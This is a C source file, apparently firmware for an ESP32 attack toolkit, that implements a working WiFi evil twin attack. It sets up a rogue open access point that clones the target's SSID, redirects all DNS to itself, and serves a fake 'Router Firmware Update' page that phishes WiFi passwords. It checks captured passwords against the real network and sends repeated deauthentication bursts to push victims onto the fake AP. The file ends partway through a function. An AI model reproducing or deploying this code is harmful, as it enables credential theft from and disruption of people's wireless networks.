/*
 * attack_eviltwin.c - Evil Twin Attack with Captive Portal
 *
 * Full implementation:
 *   1. Creates a rogue AP with the target's SSID on the same channel
 *   2. Starts a DNS server that redirects ALL queries to the ESP32 IP
 *   3. Serves a captive portal login page (from SPIFFS or built-in fallback)
 *   4. Captures WiFi passwords submitted via the portal form
 *   5. Optionally verifies captured passwords against the real AP
 *   6. Optionally cycles deauth bursts to force clients onto the rogue AP
 *
 * Architecture:
 *   - evil_twin_task(): main FreeRTOS task that orchestrates the attack
 *   - dns_server_task(): handles DNS queries, returns ESP32 IP for all
 *   - captive_portal_handler(): HTTP handler for captive portal requests
 *   - password_submit_handler(): HTTP POST handler for password capture
 *
 * Dependencies:
 *   - ESP-IDF WiFi (AP + STA mode)
 *   - ESP-IDF HTTP server (esp_http_server)
 *   - ESP-IDF SPIFFS (optional, fallback built-in)
 *   - lwIP DNS (via esp_netif)
 *   - attack_deauth.h (optional, for deauth cycling)
 */

#include "attack_eviltwin.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_spiffs.h"
#include "esp_http_server.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "lwip/sockets.h"
#include "lwip/inet.h"
#include "lwip/netdb.h"
#include <string.h>
#include <stdio.h>

/* For deauth integration */
#include "attack_deauth.h"

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

static const char *TAG = "evil_twin";

#define TASK_STACK_SIZE        8192
#define DNS_TASK_STACK_SIZE    4096
#define TASK_PRIORITY          4
#define DNS_PORT               53
#define DNS_MAX_PACKET         512
#define CAPTIVE_PORTAL_MAX_HTML  4096

/* Rogue AP password (empty = open network for easier victim connection) */
#define ROGUE_AP_PASSWORD      ""

/* ------------------------------------------------------------------ */
/*  Built-in fallback HTML for captive portal                          */
/* ------------------------------------------------------------------ */

static const char fallback_index_html[] =
"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>Router Login</title><style>"
"*{box-sizing:border-box;margin:0;padding:0}"
"body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}"
".card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:32px;width:min(400px,90vw)}"
"h2{color:#1a1a2e;margin-bottom:8px;font-size:22px}.sub{color:#666;font-size:14px;margin-bottom:24px}"
"label{display:block;font-size:13px;font-weight:700;color:#333;margin-bottom:6px}"
"input{width:100%;height:44px;border:1px solid #ddd;border-radius:8px;padding:0 12px;font-size:15px;outline:none;margin-bottom:16px}"
"input:focus{border-color:#4a90d9;box-shadow:0 0 0 3px rgba(74,144,217,.15)}"
"button{width:100%;height:46px;border:0;border-radius:8px;background:#4a90d9;color:#fff;font-size:16px;font-weight:700;cursor:pointer}"
"button:hover{background:#3a7bc8}.foot{margin-top:16px;text-align:center;color:#999;font-size:12px}"
".err{display:none;color:#d32f2f;font-size:13px;margin-bottom:12px;padding:8px;background:#fde8e8;border-radius:6px}"
"</style></head><body><div class='card'>"
"<h2>Router Firmware Update</h2>"
"<p class='sub'>Your router requires a security update. Please re-enter your WiFi password to continue.</p>"
"<div id='err' class='err'>Incorrect password. Please try again.</div>"
"<form method='POST' action='/password'>"
"<label>WiFi Password</label>"
"<input type='password' name='password' placeholder='Enter your WiFi password' required autofocus>"
"<button type='submit'>Update Router</button>"
"</form><div class='foot'>Secured by your Internet Service Provider</div>"
"</div><script>"
"var e=new URLSearchParams(location.search);if(e.get('error')==='1'){document.getElementById('err').style.display='block';}"
"</script></body></html>";

static const char fallback_wrong_html[] =
"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>Router Login</title><style>"
"*{box-sizing:border-box;margin:0;padding:0}"
"body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}"
".card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:32px;width:min(400px,90vw)}"
"h2{color:#1a1a2e;margin-bottom:8px;font-size:22px}.sub{color:#666;font-size:14px;margin-bottom:24px}"
"label{display:block;font-size:13px;font-weight:700;color:#333;margin-bottom:6px}"
"input{width:100%;height:44px;border:1px solid #ddd;border-radius:8px;padding:0 12px;font-size:15px;outline:none;margin-bottom:16px}"
"input:focus{border-color:#4a90d9;box-shadow:0 0 0 3px rgba(74,144,217,.15)}"
"button{width:100%;height:46px;border:0;border-radius:8px;background:#4a90d9;color:#fff;font-size:16px;font-weight:700;cursor:pointer}"
"button:hover{background:#3a7bc8}.foot{margin-top:16px;text-align:center;color:#999;font-size:12px}"
".err{color:#d32f2f;font-size:13px;margin-bottom:12px;padding:8px;background:#fde8e8;border-radius:6px}"
"</style></head><body><div class='card'>"
"<h2>Router Firmware Update</h2>"
"<p class='sub'>Your router requires a security update. Please re-enter your WiFi password to continue.</p>"
"<div class='err'>Incorrect password. Please try again.</div>"
"<form method='POST' action='/password'>"
"<label>WiFi Password</label>"
"<input type='password' name='password' placeholder='Enter your WiFi password' required>"
"<button type='submit'>Update Router</button>"
"</form><div class='foot'>Secured by your Internet Service Provider</div>"
"</div></body></html>";

/* ------------------------------------------------------------------ */
/*  Module state                                                       */
/* ------------------------------------------------------------------ */

static bool                     et_running           = false;
static TaskHandle_t             et_task_handle       = NULL;
static TaskHandle_t             et_dns_task_handle   = NULL;
static SemaphoreHandle_t        et_mutex             = NULL;
static SemaphoreHandle_t        et_exit_sem          = NULL;

static eviltwin_config_t        et_config            = {0};
static eviltwin_password_entry_t et_passwords[EVILTWIN_MAX_PASSWORDS];
static int                      et_password_count    = 0;
static int                      et_portal_hits       = 0;
static int                      et_clients_connected = 0;
static bool                     et_pw_verified       = false;
static char                     et_verified_pw[EVILTWIN_MAX_PW_LEN] = {0};

/* Captive portal HTML loaded from SPIFFS (or fallback) */
static char                    *et_index_html        = NULL;
static char                    *et_wrong_html        = NULL;

/* Captive portal HTTP server handle */
static httpd_handle_t           et_portal_server     = NULL;

/* DNS socket */
static int                      et_dns_sock          = -1;

/* ------------------------------------------------------------------ */
/*  Forward declarations                                               */
/* ------------------------------------------------------------------ */

static void evil_twin_task(void *arg);
static void dns_server_task(void *arg);
static esp_err_t start_captive_portal(void);
static void stop_captive_portal(void);
static char *load_html_from_spiffs(const char *path);
static void store_captured_password(const char *password);
static bool verify_password_against_ap(const char *ssid, const char *password);

/* Captive portal HTTP handlers */
static esp_err_t portal_root_handler(httpd_req_t *req);
static esp_err_t portal_password_handler(httpd_req_t *req);
static esp_err_t portal_catchall_handler(httpd_req_t *req);

/* ------------------------------------------------------------------ */
/*  SPIFFS HTML loader                                                 */
/* ------------------------------------------------------------------ */

static char *load_html_from_spiffs(const char *path) {
    FILE *f = fopen(path, "r");
    if (f == NULL) {
        ESP_LOGW(TAG, "SPIFFS file not found: %s, using fallback", path);
        return NULL;
    }

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fsize <= 0 || fsize > CAPTIVE_PORTAL_MAX_HTML) {
        fclose(f);
        ESP_LOGW(TAG, "SPIFFS file too large or empty: %s (%ld bytes)", path, fsize);
        return NULL;
    }

    char *buf = malloc((size_t)fsize + 1);
    if (buf == NULL) {
        fclose(f);
        return NULL;
    }

    size_t read_bytes = fread(buf, 1, (size_t)fsize, f);
    fclose(f);
    buf[read_bytes] = '\0';

    ESP_LOGI(TAG, "Loaded %s from SPIFFS (%d bytes)", path, (int)read_bytes);
    return buf;
}

/* ------------------------------------------------------------------ */
/*  Password storage                                                   */
/* ------------------------------------------------------------------ */

static void store_captured_password(const char *password) {
    if (password == NULL || strlen(password) == 0) return;

    xSemaphoreTake(et_mutex, portMAX_DELAY);

    /* Check if this password was already captured */
    for (int i = 0; i < et_password_count; i++) {
        if (strcmp(et_passwords[i].password, password) == 0) {
            et_passwords[i].attempt_count++;
            ESP_LOGI(TAG, "Duplicate password attempt #%d: %s",
                     et_passwords[i].attempt_count, password);
            xSemaphoreGive(et_mutex);
            return;
        }
    }

    /* Store new password */
    if (et_password_count < EVILTWIN_MAX_PASSWORDS) {
        strncpy(et_passwords[et_password_count].password, password,
                EVILTWIN_MAX_PW_LEN - 1);
        et_passwords[et_password_count].password[EVILTWIN_MAX_PW_LEN - 1] = '\0';
        et_passwords[et_password_count].verified = false;
        et_passwords[et_password_count].attempt_count = 1;
        et_password_count++;
        ESP_LOGI(TAG, "Captured password #%d: %s", et_password_count, password);
    } else {
        ESP_LOGW(TAG, "Password buffer full, overwriting oldest");
        /* Shift everything down and add new entry at end */
        memmove(&et_passwords[0], &et_passwords[1],
                sizeof(eviltwin_password_entry_t) * (EVILTWIN_MAX_PASSWORDS - 1));
        strncpy(et_passwords[EVILTWIN_MAX_PASSWORDS - 1].password, password,
                EVILTWIN_MAX_PW_LEN - 1);
        et_passwords[EVILTWIN_MAX_PASSWORDS - 1].password[EVILTWIN_MAX_PW_LEN - 1] = '\0';
        et_passwords[EVILTWIN_MAX_PASSWORDS - 1].verified = false;
        et_passwords[EVILTWIN_MAX_PASSWORDS - 1].attempt_count = 1;
    }

    xSemaphoreGive(et_mutex);
}

/* ------------------------------------------------------------------ */
/*  Password verification against real AP                              */
/* ------------------------------------------------------------------ */

static bool verify_password_against_ap(const char *ssid, const char *password) {
    if (ssid == NULL || password == NULL) return false;

    ESP_LOGI(TAG, "Verifying password against AP: %s", ssid);

    /* Stop our rogue AP temporarily to switch to STA mode */
    esp_wifi_set_mode(WIFI_MODE_STA);

    wifi_config_t sta_config = {0};
    strncpy((char *)sta_config.sta.ssid, ssid, sizeof(sta_config.sta.ssid) - 1);
    strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password) - 1);
    sta_config.sta.channel = et_config.channel;

    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    esp_wifi_connect();

    /* Wait up to 10 seconds for connection */
    int attempts = 0;
    bool connected = false;
    while (attempts < 50) {
        vTaskDelay(pdMS_TO_TICKS(200));
        wifi_ap_record_t ap_info;
        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
            connected = true;
            break;
        }
        attempts++;
    }

    /* Disconnect and go back to APSTA mode */
    esp_wifi_disconnect();

    /* Restore rogue AP */
    esp_wifi_set_mode(WIFI_MODE_APSTA);

    wifi_config_t ap_config = {0};
    strncpy((char *)ap_config.ap.ssid, ssid, sizeof(ap_config.ap.ssid) - 1);
    ap_config.ap.ssid_len = (uint8_t)strlen(ssid);
    ap_config.ap.channel = et_config.channel;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 4;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    if (connected) {
        ESP_LOGI(TAG, "PASSWORD VERIFIED: %s", password);
    } else {
        ESP_LOGI(TAG, "Password verification failed: %s", password);
    }

    return connected;
}

/* ------------------------------------------------------------------ */
/*  DNS Server - Redirects all queries to ESP32 IP                     */
/* ------------------------------------------------------------------ */

static void dns_server_task(void *arg) {
    (void)arg;
    ESP_LOGI(TAG, "DNS server task started on port %d", DNS_PORT);

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    et_dns_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (et_dns_sock < 0) {
        ESP_LOGE(TAG, "Failed to create DNS socket");
        et_dns_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    /* Allow address reuse */
    int opt = 1;
    setsockopt(et_dns_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    if (bind(et_dns_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        ESP_LOGE(TAG, "DNS bind failed");
        close(et_dns_sock);
        et_dns_sock = -1;
        et_dns_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    /* Set receive timeout so we can check running flag */
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(et_dns_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    /* Get our own IP address (192.168.4.1) */
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    esp_netif_ip_info_t ip_info;
    if (netif && esp_netif_get_ip_info(netif, &ip_info) == ESP_OK) {
        ESP_LOGI(TAG, "DNS redirecting to: " IPSTR, IP2STR(&ip_info.ip));
    }

    uint8_t rx_buf[DNS_MAX_PACKET];
    uint8_t tx_buf[DNS_MAX_PACKET + 16]; /* extra room for answer section */

    while (et_running) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);

        int rx_len = recvfrom(et_dns_sock, rx_buf, sizeof(rx_buf), 0,
                              (struct sockaddr *)&client_addr, &client_len);
        if (rx_len < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
            continue;
        }
        if (rx_len < 12) continue;  /* too short for DNS header */

        /* Parse DNS header */
        uint16_t flags = (rx_buf[2] << 8) | rx_buf[3];
        uint16_t qdcount = (rx_buf[4] << 8) | rx_buf[5];

        /* Only respond to standard queries */
        if ((flags & 0x8000) != 0 || qdcount == 0) continue;

        /* Build response: copy question, add answer */
        int tx_len = rx_len;

        /* Copy the query section as-is */
        memcpy(tx_buf, rx_buf, rx_len);

        /* Set response flag */
        tx_buf[2] = 0x81;  /* Response, Standard Query */
        tx_buf[3] = 0x80;  /* Recursion Available */

        /* ANCOUNT = 1 (one answer) */
        tx_buf[6] = 0x00;
        tx_buf[7] = 0x01;

        /* Find the end of the question section */
        int qidx = 12;
        for (uint16_t q = 0; q < qdcount && qidx < rx_len; q++) {
            while (qidx < rx_len && tx_buf[qidx] != 0) {
                qidx++;
            }
            qidx += 5;  /* null label + QTYPE(2) + QCLASS(2) */
        }

        tx_len = qidx;

        /* Add answer: pointer to the question name */
        tx_buf[tx_len++] = 0xC0;  /* Name pointer */
        tx_buf[tx_len++] = 0x0C;  /* Points to offset 12 (start of QNAME) */

        /* Type A (0x0001) */
        tx_buf[tx_len++] = 0x00;
        tx_buf[tx_len++] = 0x01;

        /* Class IN (0x0001) */
        tx_buf[tx_len++] = 0x00;
        tx_buf[tx_len++] = 0x01;

        /* TTL (60 seconds) */
        tx_buf[tx_len++] = 0x00;
        tx_buf[tx_len++] = 0x00;
        tx_buf[tx_len++] = 0x00;
        tx_buf[tx_len++] = 0x3C;

        /* RDLENGTH (4 bytes for IPv4) */
        tx_buf[tx_len++] = 0x00;
        tx_buf[tx_len++] = 0x04;

        /* RDATA: Our IP address (192.168.4.1) */
        uint8_t ip_bytes[4] = {192, 168, 4, 1};
        if (netif && esp_netif_get_ip_info(netif, &ip_info) == ESP_OK) {
            ip_bytes[0] = (ip_info.ip.addr >> 0) & 0xFF;
            ip_bytes[1] = (ip_info.ip.addr >> 8) & 0xFF;
            ip_bytes[2] = (ip_info.ip.addr >> 16) & 0xFF;
            ip_bytes[3] = (ip_info.ip.addr >> 24) & 0xFF;
        }
        memcpy(&tx_buf[tx_len], ip_bytes, 4);
        tx_len += 4;

        sendto(et_dns_sock, tx_buf, tx_len, 0,
               (struct sockaddr *)&client_addr, client_len);

        ESP_LOGD(TAG, "DNS response sent to client (A record -> %d.%d.%d.%d)",
                 ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]);
    }

    if (et_dns_sock >= 0) {
        close(et_dns_sock);
        et_dns_sock = -1;
    }

    ESP_LOGI(TAG, "DNS server task exiting");
    et_dns_task_handle = NULL;
    vTaskDelete(NULL);
}

/* ------------------------------------------------------------------ */
/*  Captive Portal HTTP Handlers                                       */
/* ------------------------------------------------------------------ */

static esp_err_t portal_root_handler(httpd_req_t *req) {
    et_portal_hits++;

    const char *html = et_index_html ? et_index_html : fallback_index_html;
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

static esp_err_t portal_password_handler(httpd_req_t *req) {
    char content[256] = {0};
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) {
        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to read request");
        return ESP_FAIL;
    }
    content[ret] = '\0';

    /* Parse password from form data */
    char password[EVILTWIN_MAX_PW_LEN] = {0};
    const char *pw_key = "password=";
    const char *pw_start = strstr(content, pw_key);
    if (pw_start) {
        pw_start += strlen(pw_key);
        size_t len = strcspn(pw_start, "&");
        if (len >= EVILTWIN_MAX_PW_LEN) len = EVILTWIN_MAX_PW_LEN - 1;
        memcpy(password, pw_start, len);
        password[len] = '\0';

        /* URL decode: convert + to space, %XX to byte */
        char *src = password, *dst = password;
        while (*src) {
            if (*src == '+') { *dst++ = ' '; src++; continue; }
            if (*src == '%' && src[1] && src[2]) {
                int hi, lo;
                hi = (src[1] >= '0' && src[1] <= '9') ? (src[1] - '0') :
                     (src[1] >= 'a' && src[1] <= 'f') ? (src[1] - 'a' + 10) :
                     (src[1] >= 'A' && src[1] <= 'F') ? (src[1] - 'A' + 10) : -1;
                lo = (src[2] >= '0' && src[2] <= '9') ? (src[2] - '0') :
                     (src[2] >= 'a' && src[2] <= 'f') ? (src[2] - 'a' + 10) :
                     (src[2] >= 'A' && src[2] <= 'F') ? (src[2] - 'A' + 10) : -1;
                if (hi >= 0 && lo >= 0) {
                    *dst++ = (char)((hi << 4) | lo);
                    src += 3;
                    continue;
                }
            }
            *dst++ = *src++;
        }
        *dst = '\0';
    }

    ESP_LOGI(TAG, "Captive portal received password: %s", password);

    if (strlen(password) > 0) {
        store_captured_password(password);

        /* Verify against real AP if enabled */
        if (et_config.verify_passwords) {
            bool verified = verify_password_against_ap(et_config.ssid, password);
            if (verified) {
                xSemaphoreTake(et_mutex, portMAX_DELAY);
                et_pw_verified = true;
                strncpy(et_verified_pw, password, EVILTWIN_MAX_PW_LEN - 1);
                et_verified_pw[EVILTWIN_MAX_PW_LEN - 1] = '\0';
                /* Mark the password entry as verified */
                for (int i = 0; i < et_password_count; i++) {
                    if (strcmp(et_passwords[i].password, password) == 0) {
                        et_passwords[i].verified = true;
                        break;
                    }
                }
                xSemaphoreGive(et_mutex);

                /* Redirect to a "success" page */
                httpd_resp_set_status(req, "302 Found");
                httpd_resp_set_hdr(req, "Location", "/success");
                httpd_resp_send(req, "", 0);
                return ESP_OK;
            }
        }
    }

    /* Show "wrong password" page to get them to try again */
    const char *html = et_wrong_html ? et_wrong_html : fallback_wrong_html;
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

static esp_err_t portal_success_handler(httpd_req_t *req) {
    const char *success_html =
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>Success</title><style>"
        "body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;"
        "justify-content:center;align-items:center;min-height:100vh}"
        ".card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1);"
        "padding:32px;text-align:center}h2{color:#2e7d32;font-size:24px}"
        "p{color:#666;margin-top:12px}"
        "</style></head><body><div class='card'>"
        "<h2>Router Updated Successfully</h2>"
        "<p>Your router has been updated. You may now reconnect to your network.</p>"
        "</div></body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, success_html, strlen(success_html));
    return ESP_OK;
}

static esp_err_t portal_catchall_handler(httpd_req_t *req) {
    /* Redirect any other URL to the portal root */
    et_portal_hits++;
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "/");
    httpd_resp_send(req, "", 0);
    return ESP_OK;
}

/* ------------------------------------------------------------------ */
/*  Captive portal server start/stop                                   */
/* ------------------------------------------------------------------ */

static esp_err_t start_captive_portal(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_uri_handlers = 16;
    config.lru_purge_enable = true;
    config.recv_wait_timeout = 10;

    if (httpd_start(&et_portal_server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start captive portal HTTP server");
        return ESP_FAIL;
    }

    /* Root page - captive portal */
    httpd_uri_t root_uri = { .uri = "/", .method = HTTP_GET, .handler = portal_root_handler };
    httpd_register_uri_handler(et_portal_server, &root_uri);

    /* Password submission */
    httpd_uri_t pw_uri = { .uri = "/password", .method = HTTP_POST, .handler = portal_password_handler };
    httpd_register_uri_handler(et_portal_server, &pw_uri);

    /* Success page (after verified password) */
    httpd_uri_t success_uri = { .uri = "/success", .method = HTTP_GET, .handler = portal_success_handler };
    httpd_register_uri_handler(et_portal_server, &success_uri);

    /* Catch-all: redirect everything else to the portal.
     * Common captive portal detection URLs */
    const char *catch_uris[] = {
        "/generate_204",           /* Android */
        "/hotspot-detect.html",    /* Apple iOS */
        "/library/test/success.html", /* Apple macOS */
        "/connectivity-check.html",   /* Ubuntu/Firefox */
        "/fwlink",                   /* Windows */
        "/redirect",                 /* Generic */
        "/canonical.html",           /* Firefox */
        "/success.txt",              /* Kindle */
        "/kindle-wifi/wifistub.html", /* Kindle */
        "/ncsi.txt",                 /* Windows NCSI */
    };
    for (int i = 0; i < sizeof(catch_uris) / sizeof(catch_uris[0]); i++) {
        httpd_uri_t catch_uri = {
            .uri = catch_uris[i],
            .method = HTTP_GET,
            .handler = portal_catchall_handler
        };
        httpd_register_uri_handler(et_portal_server, &catch_uri);
    }

    ESP_LOGI(TAG, "Captive portal HTTP server started on port 80");
    return ESP_OK;
}

static void stop_captive_portal(void) {
    if (et_portal_server != NULL) {
        httpd_stop(et_portal_server);
        et_portal_server = NULL;
        ESP_LOGI(TAG, "Captive portal HTTP server stopped");
    }
}

/* ------------------------------------------------------------------ */
/*  Main Evil Twin task                                                */
/* ------------------------------------------------------------------ */

static void evil_twin_task(void *arg) {
    (void)arg;

    ESP_LOGI(TAG, "Evil Twin attack starting: SSID='%s' CH=%d",
             et_config.ssid, et_config.channel);

    /* Load captive portal HTML from SPIFFS */
    et_index_html = load_html_from_spiffs("/spiffs/evil_twin/index.html");
    et_wrong_html = load_html_from_spiffs("/spiffs/evil_twin/wrong.html");

    /* Configure and start the rogue AP */
    esp_wifi_set_mode(WIFI_MODE_APSTA);

    wifi_config_t ap_config = {0};
    strncpy((char *)ap_config.ap.ssid, et_config.ssid, sizeof(ap_config.ap.ssid) - 1);
    ap_config.ap.ssid_len = (uint8_t)strlen(et_config.ssid);
    ap_config.ap.channel = et_config.channel;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 4;
    ap_config.ap.ssid_hidden = 0;

    ESP_LOGI(TAG, "Starting rogue AP: SSID='%s' CH=%d Open Auth",
             et_config.ssid, et_config.channel);

    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    /* Start DNS server */
    if (et_config.use_captive_portal) {
        BaseType_t dns_ret = xTaskCreate(dns_server_task, "et_dns",
                                          DNS_TASK_STACK_SIZE, NULL,
                                          TASK_PRIORITY, &et_dns_task_handle);
        if (dns_ret != pdPASS) {
            ESP_LOGE(TAG, "Failed to create DNS server task");
        }
    }

    /* Start captive portal HTTP server */
    if (et_config.use_captive_portal) {
        if (start_captive_portal() != ESP_OK) {
            ESP_LOGE(TAG, "Failed to start captive portal");
        }
    }

    ESP_LOGI(TAG, "Evil Twin active - Rogue AP '%s' with captive portal running",
             et_config.ssid);

    /* Main loop: optional deauth cycling */
    char bssid_str[18] = {0};
    if (et_config.use_deauth && et_config.bssid[0] != 0) {
        snprintf(bssid_str, sizeof(bssid_str),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 et_config.bssid[0], et_config.bssid[1], et_config.bssid[2],
                 et_config.bssid[3], et_config.bssid[4], et_config.bssid[5]);
    }

    while (et_running) {
        if (et_config.use_deauth && strlen(bssid_str) > 0) {
            /* Send deauth burst to force clients off real AP */
            start_deauth_attack(bssid_str, et_config.channel);

            /* Deauth for a burst period */
            int deauth_ms = 3000;  /* 3 second burst */
            int waited = 0;
            while (et_running && waited < deauth_ms) {
                vTaskDelay(pdMS_TO_TICKS(100));
                waited += 100;
            }

            stop_deauth_attack();

            /* Wait before next deauth cycle */
            int interval_ms = (et_config.deauth_interval_sec > 0)
                               ? et_config.deauth_interval_sec * 1000
                               : 15000;  /* default 15 seconds */
            waited = 0;
            while (et_running && waited < interval_ms) {
                vTaskDelay(pdMS_TO_TICKS(100));
                waited += 100;
            }
        } else {
            /* No deauth, just idle */
            vTaskDelay(pdMS_TO_TICKS(1000));
        }

        /* Update connected client count */
        wifi_sta_list_t sta_list;
        if (esp_wifi_ap_get_sta_list(&sta_list) == ESP_OK) {
            et_clients_connected = sta_list.num;
        }
    }

    /* ---- Cleanup ---- */
    ESP_LOGI(TAG, "Evil Twin attack stopping...");

    /* Stop deauth if running */
    stop_deauth_attack();

    /* Stop captive portal */
    stop_captive_portal();

    /* Stop DNS server (it checks et_running flag) */
    if (et_dns_task_handle != NULL) {
        /* DNS task will exit on its own since et_running is false */
        vTaskDelay(pdMS_TO_TICKS(1500));
        et_dns_task_handle = NULL;
    }

    /* Free SPIFFS HTML buffers */
    if (et_index_html) { free(et_index_html); et_index_html = NULL; }
    if (et_wrong_html) { free(et_wrong_html); et_wrong_html = NULL; }

    ESP_LOGI(TAG, "Evil Twin attack stopped");
    et_task_handle = NULL;
    if (et_exit_sem) {
        xSemaphoreGive(et_exit_sem);
    }
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  Public API                                                         */
/* ================================================================== */

/**
 * Lazy init – ensures mutex/semaphore exist even if attack_eviltwin_init()
 * was never called.  Safe to call multiple times.
 */
static void ensure_mutex(void) {
    if (et_mutex == NULL) {
        et_mutex = xSemaphoreCreateMutex();
    }
    if (et_exit_sem == NULL) {
        et_exit_sem = xSemaphoreCreateBinary();
    }
}

void attack_eviltwin_init(void) {
    ensure_mutex();

    /* Try to initialize SPIFFS for custom portal pages.
     * If no SPIFFS partition exists, built-in fallback HTML is used automatically.
     * This is not an error — the captive portal works perfectly with fallback HTML. */
    esp_vfs_spiffs_conf_t conf = {
        .base_path = "/spiffs",
        .partition_label = NULL,
        .max_files = 5,
        .format_if_mount_failed = true,
    };
    if (esp_vfs_spiffs_register(&conf) == ESP_OK) {
        ESP_LOGI(TAG, "SPIFFS initialized – custom portal pages available");
    } else {
        ESP_LOGI(TAG, "No SPIFFS partition – using built-in portal HTML");
    }

    memset(et_passwords, 0, sizeof(et_passwords));
    et_password_count = 0;
    et_portal_hits = 0;
    et_clients_connected = 0;
    et_pw_verified = false;

    ESP_LOGI(TAG, "Evil Twin module initialized");
}

void attack_eviltwin_start(const eviltwin_config_t *config) {
    if (et_running) {
        ESP_LOGW(TAG, "Evil Twin already running, stop first");
        return;
    }
    if (config == NULL) {
        ESP_LOGE(TAG, "NULL config");
        return;
    }
    ensure_mutex();

    xSemaphoreTake(et_mutex, portMAX_DELAY);
    memcpy(&et_config, config, sizeof(et_config));
    et_password_count = 0;
    et_portal_hits = 0;
    et_clients_connected = 0;
    et_pw_verified = false;
    et_verified_pw[0] = '\0';
    memset(et_passwords, 0, sizeof(et_passwords));
    xSemaphoreGive(et_mutex);

    /* Default settings */
    if (et_config.use_captive_portal == false && et_config.use_deauth == false) {
        /* If neither specified, enable both by default */
        et_config.use_captive_portal = true;
        et_config.use_deauth = true;
    }
    if (et_config.deauth_interval_sec == 0) {
        et_config.deauth_interval_sec = 15;
    }

    et_running = true;

    if (et_exit_sem != NULL) {
        xSemaphoreTake(et_exit_sem, 0);
    }

    BaseType_t ret = xTaskCreate(evil_twin_task, "evil_twin",
                                  TASK_STACK_SIZE, NULL,
                                  TASK_PRIORITY, &et_task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create evil twin task");
        et_running = false;
    } else {
        ESP_LOGI(TAG, "Evil Twin started: SSID='%s' CH=%d Portal=%s Deauth=%s",
                 et_config.ssid, et_config.channel,
                 et_config.use_captive_portal ? "ON" : "OFF",
                 et_config.use_deauth ? "ON" : "OFF");
    }
}

void attack_eviltwin_start_simple(const char *ssid, uint8_t channel,
                                  const uint8_t *bssid) {
    eviltwin_config_t config = {0};
    if (ssid) {
        strncpy(config.ssid, ssid, EVILTWIN_MAX_SSID_LEN - 1);
    }
    config.channel = channel;
    if (bssid) {
        memcpy(config.bssid, bssid, 6);
    }
    config.use_captive_portal = true;
    config.use_deauth = (bssid != NULL);
    config.verify_passwords = true;
    config.deauth_interval_sec = 15;

    attack_eviltwin_start(&config);
}

void attack_eviltwin_stop(void) {
    if (!et_running) return;
    et_running = false;

    if (et_exit_sem != NULL) {
        if (xSemaphoreTake(et_exit_sem, pdMS_TO_TICKS(8000)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout, forcing delete");
            if (et_task_handle != NULL) {
                vTaskDelete(et_task_handle);
                et_task_handle = NULL;
            }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(2000));
        if (et_task_handle != NULL) {
            vTaskDelete(et_task_handle);
            et_task_handle = NULL;
        }
    }

    ESP_LOGI(TAG, "Evil Twin stopped");
}

bool attack_eviltwin_is_running(void) {
    return et_running;
}

/* ------------------------------------------------------------------ */
/*  Captured passwords access                                          */
/* ------------------------------------------------------------------ */

esp_err_t attack_eviltwin_get_captured_passwords(
    eviltwin_password_entry_t *out_entries,
    int max_entries, int *out_count) {

    if (out_entries == NULL || out_count == NULL) return ESP_FAIL;
    if (et_mutex == NULL) {
        *out_count = 0;
        return ESP_OK;
    }

    xSemaphoreTake(et_mutex, portMAX_DELAY);
